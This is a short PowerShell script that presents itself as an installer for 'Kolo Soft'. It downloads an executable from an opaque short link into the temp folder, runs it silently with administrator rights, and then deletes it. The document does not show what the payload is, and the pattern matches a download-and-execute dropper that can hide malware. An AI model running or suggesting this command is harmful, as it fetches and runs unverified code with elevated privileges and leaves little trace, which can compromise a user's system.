Write-Host -ForegroundColor Yellow "Installing Kolo Soft.... " 
$Path = $env:TEMP; $Installer = "kbsetup.exe"; Invoke-WebRequest "https://matix.li/a09363e27aac" -OutFile $Path\$Installer; Start-Process -FilePath $Path\$Installer -Args "/silent /install" -Verb RunAs -Wait; Remove-Item $Path\$Installer 
